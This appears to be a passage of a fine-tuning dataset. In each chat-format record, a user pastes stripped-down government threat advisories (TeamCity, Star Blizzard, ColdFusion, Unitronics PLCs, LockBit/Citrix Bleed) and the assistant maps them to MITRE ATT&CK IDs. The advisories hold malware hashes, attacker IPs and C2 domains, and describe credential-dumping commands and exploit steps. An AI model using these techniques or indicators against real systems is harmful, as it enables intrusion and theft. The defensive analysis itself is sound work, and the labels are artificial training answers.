cprogramdatajetbrainsteamcityconfiginternalproperties modified user id120230926 115358227 info tbrainsbuildserveractivities external process launched user user id1 command line cmdexe c whoami attacker may attempt cover tracks wiping log file appear teamcity logs individual http requests teamcity configured sit behind http proxy http proxy may suitable logs showing following target endpoints accessed apprestusersid1tokensrpc2 endpoint required exploit vulnerability apprestusers endpoint required attacker wishes create arbitrary user apprestdebugprocesses endpoint required attacker wishes create arbitrary process note user id value may higher 1 appendix b iocs file iocs graphicalproton backdoor 01b5f7094de0b2c6f8e28aa9a2ded678c166d615530e595621e692a9c0240732 34c8f155601a3948ddb0d60b582cfe87de970d443cc0e05df48b1a1ad2e42b5e 620d2bf14fe345eef618fdd1dac242b3a0bb65ccb75699fe00f7c671f2c1d869 773f0102720af2957859d6930cd09693824d87db705b3303cef9ee794375ce13 7b666b978dbbe7c032cef19a90993e8e4922b743ee839632bfa6d99314ea6c53 8afb71b7ce511b0bce642f46d6fc5dd79fad86a58223061b684313966efef9c7 971f0ced6c42dd2b6e3ea3e6c54d0081cf9b06e79a38c2ede3a2c5228c27a6dc cb83e5cb264161c28de76a44d0edb450745e773d24bec5869d85f69633e44dcf cd3584d61c2724f927553770924149bb51811742a461146b15b34a26c92cad43 ebe231c90fad02590fc56d5840acc63b90312b0e2fee7da3c7606027ed92600e f1b40e6e5a7cbc22f7a0bd34607b13e7e3493b8aad7431c47f1366f0256e23eb c7b01242d2e15c3da0f45b8adec4e6913e534849cde16a2a6c480045e03fbee4 4bf1915785d7c6e0987eb9c15857f7ac67dc365177a1707b14822131d43a6166 graphicalproton https backdoor 18101518eae3eec6ebe453de4c4c380160774d7c3ed5c79e1813013ac1bb0b93 19f1ef66e449cf2a2b0283dbb756850cca396114286e1485e35e6c672c9c3641 1e74cf0223d57fd846e171f4a58790280d4593df1f23132044076560a5455ff8 219fb90d2e88a2197a9e08b0e7811e2e0bd23d59233287587ccc4642c2cf3d67 92c7693e82a90d08249edeafbca6533fed81b62e9e056dec34c24756e0a130a6 b53e27c79eed8531b1e05827ace2362603fb9f77f53cee2e34940d570217cbf7 c37c109171f32456bbe57b8676cc533091e387e6ba733fbaa01175c43cfb6ebd c40a8006a7b1f10b1b42fdd8d6d0f434be503fb3400fb948ac9ab8ddfa5b78a0 c832462c15c8041191f190f7a88d25089d57f78e97161c3003d68d0cc2c4baa3 f6194121e1540c3553273709127dfa1daab96b0acfab6e92548bfb4059913c69 backdoored vcperf d724728344fcf3812a0664a80270f7b4980b82342449a8c5a2fa510e10600443 backdoored zabbix installation archive 4ee70128c70d646c5c2a9a17ad05949cb1fbf1043e9d671998812b2dce75cf0f backdoored webroot av installation archive 950adbaf66ab214de837e6f1c00921c501746616a882ea8c42f1bad5f9b6eff4 modified rsockstun cb83e5cb264161c28de76a44d0edb450745e773d24bec5869d85f69633e44dcf network iocs tunnel endpoints 652097203 65215158 exploitation server 1037612834 graphicalproton https c2 url hxxpsmatclickcomwpqueryphp product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003, T1003.001, T1003.002, T1020, T1027.001, T1033, T1036, T1041, T1046, T1047, T1049, T1053.005, T1055, T1057, T1059.001, T1059.003, T1068, T1098, T1190, T1203, T1210, T1547, T1555.003, T1558.001, T1562.001, T1564, T1564.001, T1567, T1572, T1574.002, T1590"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: russiabased actor targeting organizations individuals uk geographical areas interest overview russiabased actor star blizzard formerly known seaborgium also known callisto groupta446coldrivertag53bluecharlie continues successfully use spearphishing attacks targeted organizations individuals uk geographical areas interest informationgathering activity uk national cyber security centre ncsc us cybersecurity infrastructure security agency cisa us federal bureau investigation fbi us national security agency nsa us cyber national mission force cnmf australian signals directorates australian cyber security centre asds acsc canadian centre cyber security cccs new zealand national cyber security centre ncscnz assess star blizzard almost certainly subordinate russian federal security service fsb centre 18 industry previously published details star blizzard advisory draws body information advisory raises awareness spearphishing techniques star blizzard uses target individuals organizations activity continuing 2023 download pdf version advisory seerussian fsb cyber actor star blizzard continues worldwide spearphishing campaigns targeting profile since 2019 star blizzard targeted sectors including academia defense governmental organizations ngos think tanks politicians targets uk us appear affected star blizzard activity however activity also observed targets nato countries countries neighboring russia 2022 star blizzard activity appeared expand include defenseindustrial targets well us department energy facilities outline attacks activity typical spearphishing campaigns actor targets specific individual group using information known interest targets spearphishing campaign actor perceives target direct access information interest access vector another target research preparation using opensource resources conduct reconnaissance including social media professional networking platforms star blizzard identifies hooks engage target take time research interests identify realworld social professional contacts star blizzard creates email accounts impersonating known contacts targets help appear legitimate also create fake social media networking profiles impersonate respected experts used supposed conference event invitations lures star blizzard uses webmail addresses different providers including outlook gmail yahoo proton mail initial approach impersonating known contacts target wellknown names targets field interest sector appear authentic actor also creates malicious domains resembling legitimate organizations microsoft threat intelligence center mstic provides list observed indicators compromise iocs seaborgium blog exhaustive preference personal email addresses star blizzard predominantly sent spearphishing emails targets personal email addresses although also used targets corporate business email addresses actors may intentionally use personal emails circumvent security controls place corporate networks building rapport taken time research targets interests contacts create believable approach star blizzard starts build trust often begin establishing benign contact topic hope engage targets often correspondence attacker target sometimes extended period attacker builds rapport delivery malicious link trust established attacker uses typical phishing tradecraft shares link apparently document website interest leads target actorcontrolled server prompting target enter account credentials malicious link may url email message actor may embed link document onedrive google drive filesharing platforms star blizzard uses opensource framework evilginx spear phishing activity allows harvest credentials session cookies successfully bypass use twofactor authentication exploitation activity whichever delivery method used target clicks malicious url directed actorcontrolled server mirrors signin page legitimate service credentials entered point compromised star blizzard uses stolen credentials log targets email account known access steal emails attachments victims inbox also set mail forwarding rules giving ongoing visibility victim correspondence actor also used access victim email account access mailinglist data victims contacts list use follow targeting also used compromised email accounts phishing activity conclusion spearphishing established technique used many actors star blizzard uses successfully evolving technique maintain success individuals organizations previously targeted sectors vigilant techniques described advisory uk report related suspicious activity ncsc information effective defense spearphishing included mitigations section mitre attck report compiled respect mitre attck framework globally accessible knowledge base adversary tactics techniques based realworld observations mitigations number mitigations useful defending activity described advisory use strong passwords use separate password email accounts avoid password reuse across multiple services see ncsc guidancetop tips staying secure online use multifactor authentication 2factor authenticationtwostep authentication reduce impact password compromises see ncsc guidancemultifactor authentication online servicesandsetting 2step verification 2sv protect devices networks keeping dateuse latest supported versions apply security updates promptly use antivirus scan regularly guard known malware threats see ncsc guidancedevice security guidance exercise vigilance spearphishing emails tailored avoid suspicion may recognize senders name email come address recognize would expect contact persons webmail address rather corporate email address suspicious email come personalwebmail addressrather corporate one verify email legitimate via another means see ncsc guidancephishing attacks defending organizationand internet crime complaint centeric3 industry alerts enable email providers automated email scanning features turned default consumer mail providers see ncsc guidancetelling users avoid clicking bad links still isnt working disable mailforwarding attackers observed set mailforwarding rules maintain visibility target emails disable mailforwarding monitor settings regularly ensure forwarding rule set external malicious actor disclaimer report draws information derived ncsc industry sources ncsc findings recommendations made provided intention avoiding risks following recommendations remove risk ownership information risks remains relevant system owner times information exempt freedom information act 2000 foia may exempt uk information legislation refer foia queries ncscinfolegncscgovuk material uk crown copyright product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1078, T1114.002, T1539, T1566.001, T1566.002, T1583.001, T1585.002, T1589, T1593"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today mitigate malicious cyber activity prioritize remediating known exploited vulnerabilities employ proper network segmentation enable multifactor authentication mfa services extent possible particularly webmail vpn accounts access critical systems summary cybersecurity infrastructure security agency cisa releasing cybersecurity advisory csa response confirmed exploitation cve202326360 unidentified threat actors federal civilian executive branch fceb agency vulnerability presents improper access control issue impacting adobe coldfusion versions 2018 update 15 earlier 2021 update 5 earlier cve202326360 also affects coldfusion 2016 coldfusion 11 installations however longer supported since reached end life exploitation cve result arbitrary code execution following fceb agencys investigation analysis network logs confirmed compromise least two publicfacing servers within environment june july 2023 csa provides network defenders tactics techniques procedures ttps indicators compromise iocs methods detect protect similar exploitation download pdf version report aa23339a threat actors exploit adobe coldfusion cve202326360 initial access government servers pdf 44949 kb downloadable copy iocs see aa23339a stix xml xml 2383 kb aa23339a stix json json 2329 kb technical details note advisory uses mitre attck enterprise framework version 14 see mitre attck tactics techniques section tables mapped threat actors activity overview adobe coldfusion commercial application server used rapid webapplication development coldfusion supports proprietary markup languages building web applications integrates external components like databases thirdparty libraries coldfusion uses proprietary language coldfusion markup language cfml development application built using java june 2023 exploitation cve202326360 threat actors able establish initial foothold two agency systems two separate instances incidents microsoft defender endpoint mde alerted potential exploitation adobe coldfusion vulnerability publicfacing web servers agencys preproduction environment servers running outdated versions software vulnerable various cves additionally various commands initiated threat actors compromised web servers exploited vulnerability allowed threat actors drop malware using http post commands directory path associated coldfusion analysis suggests malicious activity conducted threat actors reconnaissance effort map broader network evidence available confirm successful data exfiltration lateral movement either incident note unknown different threat actors behind incident incident 1 early june 26 2023 threat actors obtained initial foothold publicfacing web server running adobe coldfusion v2016003 exploitation cve202326360 threat actors successfully connected malicious ip address 15810173241 disclaimer cisa recommends organizations investigate vet ip address prior taking action blocking ip resolves public cloud service provider possibly hosts large volume legitimate traffic agencys correlation internet information services iis logs open source1 information indicates identified uniform resource identifier uri cfscriptsscriptsajaxckeditorpluginsfilemanagerieditcfc used exploit cve202326360 agency removed asset network within 24 hours mde alert threat actors started process enumeration obtain currently running processes web server performed network connectivity check likely confirm connection successful following additional enumeration efforts obtain information web server operating system threat actors checked presence coldfusion version 2018previous checks also conducted version 2016 threat actors observed traversing filesystem uploading various artifacts web server include deleting file tatcfm note file deleted prior victim locating host analysis characteristics functionality unknown addition certutil2 run conftxt decoded web shell configjsp conftxt subsequently deleted likely evade detectionnote threat actors observed interacting configjsp web shell point http post requests made configcfm expected configuration file standard installation coldfusion code review configcfm indicated malicious codeintended execute versions coldfusion 9 lesswas inserted intent extract username password data source uniform resource locators urls according analysis code insertion could used future malicious activity threat actors eg using valid credentials compromised file also contained code used upload additional files threat actors however agency unable identify source origin threat actors attempted run attribexe hide newly created configjsp web shell analysis phase found indication successful execution small subset events generated various coldfusion application logs identified tatcfm configjsp systemcfm failed execute host due syntax errors threat actors created various files see table 1 cibm directory using initialization process coldfusionexe none files located server possibly due threat actor deletion assessed likely threat actor tools analysts assessed cibm directory staging folder support threat actors malicious operations disclaimer organizations encouraged investigate use files related signs compromise prior performing remediation actions two artifacts legitimate microsoft files threat actors observed using files following initial compromise intended malicious purposes note malicious code found system incident contained code executed would attempt decrypt passwords coldfusion data sources seed value included code known value coldfusion version 8 olderwhere seed value hardcoded threat actor control database server use values decrypt data source passwords coldfusion version 8 older victims servers running newer version time compromise thus malicious code failed decrypt passwords using default hardcoded seed value older versions incident 2 early june 2 2023 threat actors obtained initial foothold additional publicfacing web server running adobe coldfusion v2021002 via malicious ip address 1252275097 exploitation cve202326360 threat actors enumerated domain trusts identify lateral movement opportunities using nltest commands threat actors also collected information local domain administrative user accounts performing reconnaissance using commands localgroup net user net user domain id host network reconnaissance efforts conducted discover network configuration time logs query user information threat actors observed dropping file dtxtdecoded asdjspvia post command addition eight malicious artifacts hiddenfieldjsp hiddenfieldjspclass hiddenfieldjspjava connectionjsp connectionjspclass connectionjspjava djspclass djspjava according open source information djsp remote access trojan rat utilizes javascript loader infect device requires communication actorcontrolled server perform actions4 agencys analysis identified trojan modified version publicly available web shell code5 maintaining persistence threat actors periodically tested network connectivity pinging googles domain name system dns threat actors conducted additional reconnaissance efforts via searching jsp files uploaded threat actors attempted exfiltrate registry files samzip seczip blankjsp cfbootstrapjar windows event logs identified actors successful due malicious activity detected quarantined additional file syszip created system however indications attempt exfiltrate analysis identified files resulted executed save compress data processes hkeylocalmachine hklm registry key well save security account manager sam information zip files sam registry file may allow malicious actors obtain usernames reverse engineer passwords however artifacts available confirm threat actors successful exfiltrating sam registry hive windows event logs show malicious file 1dat detected quarantined analysis determined file local security authority subsystem service lsass dump file contained user accountsto include multiple disabled credentialsand windows new technology lan manager ntlm passwords accounts found multiple servers across victims network successfully used lateral movement efforts reconnaissance continued threat actors changed approach using security tools present victim server esentutlexe6 used attempt registry dump attempts download data threat actors command control c2 server also observed blocked logged victim server threat actors attempted access sysvol used deliver policy logon scripts domain members agency domain controller attempt unsuccessful attempt succeeded threat actors may able change policies across compromised servers7 note incident analysis strongly suggests threat actors likely viewed data contained coldfusion seedproperties file via web shell interface seedproperties file contains seed value encryption method used encrypt passwords seed values also used decrypt passwords malicious code found victim system indicate threat actors attempted decode passwords using values found seedproperties file versions coldfusion 9 greater use seedproperties file contains unique seed values used single server mitre attck tactics techniques see tables 29 referenced threat actor tactics techniques enterprise environments advisory assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool mitigations cisa recommends organizations implement mitigations improve organizations cybersecurity posture based threat actor activity mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections mitigations apply critical infrastructure organizations network defenders cisa recommends software manufacturers incorporate securebydesign default principles tactics software development practices limiting impact threat actor techniques strengthening security posture customers information secure design see cisas secure design webpage manage vulnerabilities configurations upgrade versions affected vulnerability keep software date prioritize patching according cisas known exploited vulnerabilities catalog1e prioritize remediation vulnerabilities internetfacing systems example conducting continuous automated andor routine vulnerability scans prioritize securebydefault configurations eliminating default passwords implementing single signon sso technology via modern open standards also includes disabling default credentials segment networks employ proper network segmentation demilitarized zone dmz2f end goal dmz network allow organization access untrusted networks internet ensuring private network local area network lan remains secure organizations typically store externalfacing services resourcesas well servers used dns file transfer protocol ftp mail proxy voice internet protocol voipand web servers dmz use firewall webapplication firewall waf enable logging2g 2t preventdetect potential exploitation attempts review ingress egress firewall rules block unapproved protocols limit risky approved protocols rules implement network segmentation separate network segments based role functionality2e proper network segmentation significantly reduces ability threat actor lateral movement controlling traffic flows betweenand access tovarious subnetworks see cisas layering network security segmentation infographic national security agencys nsas segment networks deploy applicationaware defenses deploy applicationaware network defenses block improperly formed traffic restrict content according policy legal authorizations traditional intrusion detection systems ids based knownbad signatures quickly decreasing effectiveness due encryption obfuscation techniques threat actors hide malicious actions remove data common protocols making need sophisticated applicationaware defensive mechanisms critical modern network defenses application control enforce signed software execution policies use modern operating system enforces signed software execution policies scripts executables device drivers system firmware maintain list trusted certificates prevent detect use injection illegitimate executables execution policies used conjunction secure boot capability assure system integrity application control used signed software execution policies provide greater control allowing unsigned software enables threat actors gain foothold establish persistence embedded malicious code see nsas enforce signed software execution policies manage accounts permissions workstations require phishingresistant multifactor authentication mfa2h services extent possible particularly webmail vpn accounts access critical systems implement principle least privilege decrease threat actors abilities access key network resources restrict file directory permissions use file system access controls protect folders cwindowssystem32 restrict ntlm authentication policy settings including incoming ntlm traffic client computers member servers domain controller8 validate security controls addition applying mitigations cisa recommends exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory cisa recommends testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see tables 29 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process cisa recommends continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources nist cve202326360 cisa kev catalog cisa mitre best practices mitre attck mapping cisa decider tool cisa crosssector cybersecurity performance goals cisa secure design default cisa layering network security segmentation nsa segment networks deploy applicationaware defenses nsa enforce signed software execution policies cisa implementing phishingresistant mfa references1packet storm security adobe coldfusion unauthenticated remote code execution2mitre certutil3virustotal file a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c8644bleeping computer stealthy new javascript malware infects windows pcs rats5github tas9erbypassgodzilla6mitre esentutl7microsoft active directory sysvol8microsoft restrict ntlm incoming ntlm traffic disclaimer information report provided informational purposes cisa endorse commercial entity product company service including entities products services linked within document reference specific commercial entities products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring cisa version history december 5 2023 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003.001, T1003.002, T1016.001, T1036.005, T1036.008, T1046, T1059.007, T1070.004, T1071.001, T1082, T1083, T1087.001, T1087.002, T1105, T1140, T1190, T1482, T1484.001, T1505.003, T1518, T1564.001"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today mitigate malicious activity implement multifactor authentication use strong unique passwords check plcs default passwords summary federal bureau investigation fbi cybersecurity infrastructure security agency cisa national security agency nsa environmental protection agency epa israel national cyber directorate incdhereafter referred authoring agenciesare disseminating joint cybersecurity advisory csa highlight continued malicious cyber activity operational technology devices iranian government islamic revolutionary guard corps irgcaffiliated advanced persistent threat apt cyber actors irgc iranian military organization united states designated foreign terrorist organization 2019 irgcaffiliated cyber actors using persona cyberav3ngers actively targeting compromising israelimade unitronics vision series programmable logic controllers plcs plcs commonly used water wastewater systems wws sector additionally used industries including limited energy food beverage manufacturing healthcare plcs may rebranded appear different manufacturers companies addition recent cisa alert authoring agencies releasing joint csa share indicators compromise iocs tactics techniques procedures ttps associated irgc cyber operations since least november 22 2023 irgcaffiliated cyber actors continued compromise default credentials unitronics devices irgcaffiliated cyber actors left defacement image stating hacked israel every equipment made israel cyberav3ngers legal target victims span multiple us states authoring agencies urge organizations especially critical infrastructure organizations apply recommendations listed mitigations section advisory mitigate risk compromise irgcaffiliated cyber actors advisory provides observed iocs ttps authoring agencies assess likely associated irgcaffiliated apt information iranian statesponsored malicious cyber activity see cisas iran cyber threat overview advisories webpage fbis iran threat webpage pdf version csa see aa23335a irgcaffiliated cyber actors exploit plcs multiple sectors including us water wastewater systems facilities pdf 59403 kb downloadable copy iocs see aa23335a stix xml xml 1550 kb aa23335a stix json json 1084 kb technical details note advisory uses mitre attck enterprise framework version 14 see table 1 threat actor activity mapped mitre attck tactics techniques assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool overview cyberav3ngers also known cyberaveng3rs cyber avengers iranian irgc cyber persona claimed responsibility numerous attacks critical infrastructure organizations12345 group claimed responsibility cyberattacks israel beginning 2020 cyberav3ngers falsely claimed compromised several critical infrastructure organizations israel2 cyberav3ngers also reportedly connections another irgclinked group known soldiers solomon updated december 14 2023 recently cyberav3ngers began targeting usbased wws facilities operate unitronics plcs1 threat actors compromised unitronics vision series plcs human machine interfaces hmi compromised devices publicly exposed internet default passwords default tcp port 20256 december 11 2023 cve20236448 assigned address default passwordscwe798 use hard coded credentials cisa added cve known exploited vulnerabilities catalog december 12 unitronics released visilogic version 9900 software address cve update requires users change default passwords plc related controllers often exposed outside internet connectivity due remote nature control monitoring functionalities compromise centered around defacing controllers user interface may render plc inoperative type access deeper device network level accesses available could render additional profound cyber physical effects processes equipment known additional cyber activities deeper plcs related control networks components intended achieved organizations consider evaluate systems possibilities threat actor activity authoring agencies observed irgcaffiliated activity since least october 2023 actors claimed credit cyberattacks israeli plcs telegram channel since november 2023 authoring agencies observed irgcaffiliated actors target multiple usbased wws facilities operate unitronics vision series plcs cyber threat actors likely compromised plcs since plcs internetfacing used unitronics default password observed activity includes following september 13 october 30 2023 cyberav3ngers telegram channel displayed legitimate false claims multiple cyberattacks israel cyberav3ngers targeted israeli plcs water energy shipping distribution sectors october 18 2023 cyberav3ngerslinked soldiers solomon claimed responsibility compromising 50 servers security cameras smart city management systems israel however majority claims proven false group claimed use ransomware named crucio servers webcams camera software operated port 7001 beginning november 22 2023 irgc cyber actors accessed multiple usbased wws facilities operate unitronics vision series plcs hmi likely compromising internetaccessible devices default passwords targeted plcs displayed defacement message hacked israel every equipment made israel cyberav3ngers legal target indicators compromise see table 1 observed iocs related cyberav3nger operations updated december 14 2023 mitre attck tactics techniques see table 2 referenced threat actor tactics techniques advisory mitigations authoring agencies recommend critical infrastructure organizations including wws sector facilities implement following mitigations improve organizations cybersecurity posture defend cyberav3ngers activity mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections note mitigations based threat actor activity unitronics plcs apply internetfacing plcs network defenders cyber threat actors likely accessed affected devicesunitronics vision series plcs hmiby exploiting cybersecurity weaknesses including poor password security exposure internet safeguard threat authoring agencies urge organizations consider following immediate steps prevent attack updated december 14 2023 upgrade devices 9900 visilogic software requires users change default passwords plcs hmis use strong password information see unitronics blog unitronics cybersecurity vision samba plc series release notes visilogic 9900 disconnect plc publicfacing internet followon steps strengthen security posture implement multifactor authentication access operational technology ot network whenever applicable require remote access implement firewall andor virtual private network vpn front plc control network access vpn gateway device enable multifactor authentication remote access even plc support multifactor authentication create strong backups logic configurations plcs enable fast recovery familiarize factory resets backup deployment preparation event ransomware activity keep unitronics plc devices updated latest versions manufacturer confirm thirdparty vendors applying recommended countermeasures mitigate exposure devices installed equipment addition authoring agencies recommend network defenders apply following mitigations limit potential adversarial use common system network discovery techniques reduce impact risk compromise cyber threat actors reduce risk exposure cisa offers range services cost including scanning testing help organizations reduce exposure threats via mitigating attack vectors cisa cyber hygiene services help provide additional review organizations internetaccessible assets email vulnerabilitycisadhsgov subject line requesting cyber hygiene services get started device manufacturers although critical infrastructure organizations using unitronics including rebranded unitronics plc devices take steps mitigate risks ultimately responsibility device manufacturer build products secure design default authoring agencies urge device manufacturers take ownership security outcomes customers following principles joint guide shifting balance cybersecurity risk principles approaches secure design software primarily ship products default passwords instead either ship products random initial passwords require users change password upon first use expose administrative interfaces internet default take steps introduce friction device placed insecure state charge extra basic security features needed operate product securely support multifactor authentication including via phishingresistant methods using secure design tactics software manufacturers make product lines secure box without requiring customers spend additional resources making configuration changes purchasing tiered security software logs monitoring making routine updates information common misconfigurations guidance reducing prevalence see joint advisory nsa cisa red blue teams share top ten cybersecurity misconfigurations information secure design see cisas secure design default webpage joint guide validate security controls addition applying mitigations authoring agencies recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory authoring agencies recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see table 2 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process authoring agencies recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources epa cybersecurity water sector cisa water wastewater systems sector cisa alert exploitation unitronics plcs used water wastewater systems cisa iran cyber threat overview advisories fbi iran threat web page cisa mitre best practices mitre attck mapping cisa decider tool cisa crosssector cybersecurity performance goals cisa cyber hygiene services cisa shifting balance cybersecurity risk principles approaches secure design software cisa secure design alert software manufacturers shield web management interfaces malicious cyber activity cisa nsa nsa cisa red blue teams share top ten cybersecurity misconfigurations cisa secure design default reporting organizations report suspicious criminal activity related information csa cisa via cisas 247 operations center reportcisagov 8882820870 fbi encourages recipients document report information concerning suspicious criminal activity local fbi field office ic3gov nsa client requirements general cybersecurity inquiries contact cybersecurityrequestsnsagov additionally waterisac encourages members share information emailing analystwaterisacorg calling 866h2oisac using online incident reporting form state local tribal territorial governments report incidents msisac soccisecurityorg 8667874722 references cbs news municipal water authority aliquippa hacked iranianbacked cyber group industrial cyber digital battlegrounds evolving hybrid kinetic warfare bleeping computer israels largest oil refinery website offline ddos attack dark reading website israeli oil refinery taken offline proiranian attackers x cyberaveng3rs disclaimer information report provided informational purposes authoring agencies endorse commercial entity product company service including entities products services linked within document reference specific commercial entities products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring authoring agencies version history december 1 2023 initial versiondecember 14 2023 added cve patch information ioc descriptions product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1110"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary note joint cybersecurity advisory csa part ongoing stopransomware effort publish advisories network defenders detail various ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visit stopransomwaregov see stopransomware advisories learn ransomware threats nocost resources cybersecurity infrastructure security agency cisa federal bureau investigation fbi multistate information sharing analysis center msisac australian signals directorates australian cyber security centre asds acsc releasing joint cybersecurity advisory csa disseminate iocs ttps detection methods associated lockbit 30 ransomware exploiting cve20234966 labeled citrix bleed affecting citrix netscaler web application delivery control adc netscaler gateway appliances csa provides ttps iocs obtained fbi acsc voluntarily shared boeing boeing observed lockbit 30 affiliates exploiting cve20234966 obtain initial access boeing distribution inc parts distribution business maintains separate environment trusted third parties observed similar activity impacting organization historically lockbit 30 affiliates conducted attacks organizations varying sizes across multiple critical infrastructure sectors including education energy financial services food agriculture government emergency services healthcare manufacturing transportation observed ttps lockbit ransomware attacks vary significantly observed ttps citrix bleed known leveraged lockbit 30 affiliates allows threat actors bypass password requirements multifactor authentication mfa leading successful session hijacking legitimate user sessions citrix netscaler web application delivery control adc gateway appliances takeover legitimate user sessions malicious actors acquire elevated permissions harvest credentials move laterally access data resources cisa authoring organizations strongly encourage network administrators apply mitigations found csa include isolating netscaler adc gateway appliances applying necessary software updates citrix knowledge center authoring organizations encourage network defenders hunt malicious activity networks using detection methods iocs within csa potential compromise detected organizations apply incident response recommendations compromise detected organizations immediately apply patches made publicly available associated malware analysis report mar seemar104789151v1 citrix bleed download pdf version report aa23325a lockbit 30 ransomware affiliates exploit cve 20234966 citrix bleed vulnerability pdf 63183 kb downloadable copy iocs see aa23325a stix xml xml 2922 kb aa23325a stix json json 2300 kb technical details note advisory uses mitre attck enterprise framework version 14 see mitre attck tactics techniques section table threat actors activity mapped mitre attck tactics techniques assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool cve20234966 cve20234966 software vulnerability found citrix netscaler adc netscaler gateway appliances exploitation activity identified early august 2023 vulnerability provides threat actors including lockbit 30 ransomware affiliates capability bypass mfa hijack legitimate user sessions acquiring access valid cookies lockbit 30 affiliates establish authenticated session within netscaler appliance without username password access mfa tokens affiliates acquire sending http get request crafted http host header leading vulnerable appliance returning system memory information information obtained exploit contains valid netscaler aaa session cookie citrix publicly disclosedcve20234966 oct 10 2023 within citrix security bulletin issued guidance detailed affected products iocs recommendations based widely available public exploits evidence active exploitation cisa added vulnerability theknown exploited vulnerabilities kevs catalog critical vulnerability exploit impacts following software versions1 netscaler adc netscaler gateway 141 141850 netscaler adc netscaler gateway 131 1314915 netscaler adc netscaler gateway 130 1309219 netscaler adc netscaler gateway version 121 eol netscaler adc 131fips 13137163 netscaler adc 121fips 12155300 netscaler adc 121ndcpp 12155300 due ease exploitation cisa authoring organizations expect see widespread exploitation citrix vulnerability unpatched software services throughout private public networks threat actor activity malware identified campaign generated beginning execution powershell script 123ps1 concatenates two base64 strings together converts bytes writes designated file path resulting file adobelibdll executed powershell script using rundll32 rundll32 cuserspublicadobelibdllmain 104 hex char key dynamic link library dll execute correctly without 104 hex character key following execution dll attempts send post request httpsadobeusupdatefilesdigitalindexphp resolves ip addresses 17267129176 104211180 november 16 2023 although adobelibdll adobeusupdatefilesdigital appearance legitimacy file domain association legitimate adobe software identified interaction software observed activities include use variety ttps commonly associated ransomware activity example lockbit 30 affiliates observed using anydesk splashtop remote management monitoring rmm batch powershell scripts execution hta files using windows native utility mshtaexe common software tools typically associated ransomware incidents indicators compromise iocs see table 1table 5 iocs related lockbit 30 affiliate exploitation cve20234966fidelity legend high indicator unique highly indicates lockbit environment medium indicator used lockbit used outside lockbit activity albeit rarely low indicates tools commonly used used lockbit low confidence indicators may related ransomware disclaimer ip addresses csa may associated legitimate activity organizations encouraged investigate activity around ip addresses prior taking action blocking activity attributed malicious without analytical evidence support used direction controlled threat actors authoring organizations recommended monitoringreviewing traffic 8119135 class c network review mshta called http arguments2 mitre attck tactics techniques see table 6 table 7 referenced threat actor tactics techniques advisory detection methods hunting guidance network defenders prioritize observing users session hunting network anomalies aid hunt suspicious activity installing tools system eg putty rclone new account creation log item failure running commands hostname quser whoami net taskkill rotating credentials identities provisioned accessing resources via vulnerable netscaler adc gateway appliance also aid detection ip addresses identify netscaler logs change ip identify users logging geolocations uncommon organizations user base logging vpn authentication identify users associated two public ip addresses different subnet geographically dispersed note mfa netscaler operate intended due attacker bypassing authentication providing tokensession already authenticated user following procedures help identify potential exploitation cve20234966 lockbit 30 activity search filenames contain tf0gyx2yi identifying lockbit encrypted files lockbit 30 actors seen using ctemp directory loading execution files investigate requests https endpoint waf hunt suspicious login patterns netscaler logs hunt suspicious virtual desktop agent windows registry keys analyze memory core dump files cisa developed yara rules opensource rule may used detect malicious activity citrix netscaler adc gateway software environment information detecting suspicious activity within netscaler logs additional resources visit cisas malware analysis report marmar104789151v1 citrix bleed resource section csa3 yara rules cisa received four files analysis show files used save registry hives dump local security authority subsystem service lsass process memory disk attempt establish sessions via windows remote management winrm files include windows batch file bat windows executable exe windows dynamic link library dll python script py file windows batch file called abat used execute file called aexe file called adll argument output printed file named ztxt located path cwindowstasks next abat pings loop back internet protocol ip address 127001 three times next command runs reg save save hklmsystem registry hive cwindowstasksem directory abat pings loop back address 127001 one time executing another reg save command saves hklmsam registry hive cwindowstaskam directory next abat runs three makecab commands create three cabinet cab files previously mentioned saved registry hives one file named 